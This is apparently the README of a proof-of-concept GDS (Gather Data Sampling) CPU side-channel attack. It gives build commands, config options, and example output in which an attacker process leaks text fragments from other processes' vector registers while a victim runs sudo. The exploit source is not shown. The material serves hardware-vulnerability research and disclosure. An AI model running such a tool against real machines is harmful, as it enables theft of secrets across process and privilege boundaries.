# Spying on ascii words with GDS

This is a proof-of-concept attack that spaws a number of threads across differnt CPUs thread and leaks various parts of the vector register, when it sees printable characters.


## Usage
`make clean && make`

`./gds`

## config.h
* P_CACHE_MISS: Prepare the transient window with cache modifying instructions
* ASSIST_UC: Use an uncacheable memory to trigger speculative data forwarding for `Gather`. Otherwise, it just does it naturally.
* AVX_512: Tests Gather on with AVX-512 instructions (Only supported on more recent CPUS).


## Example output
The victim runs this to trigger some root-privileged action:
```
victim@laptop:~$ seq 10000000 | xargs -I -- sudo true
```

The attacker steals text:
```
danielmm@laptop:~/PATH/POC/gds_spy$ ./gds | head
cpu_0_vector[0]: 2114
cpu_6_vector[4]: _TIMESTA
cpu_6_vector[9]:      un
cpu_6_vector[13]: di=0;33;
cpu_6_vector[0]: -Lapt
cpu_0_vector[0]: danielmm
cpu_6_vector[14]: 5:*.avi=
cpu_6_vector[2]: rc/s
cpu_0_vector[2]: led to p
cpu_0_vector[12]: MESSAGES
```



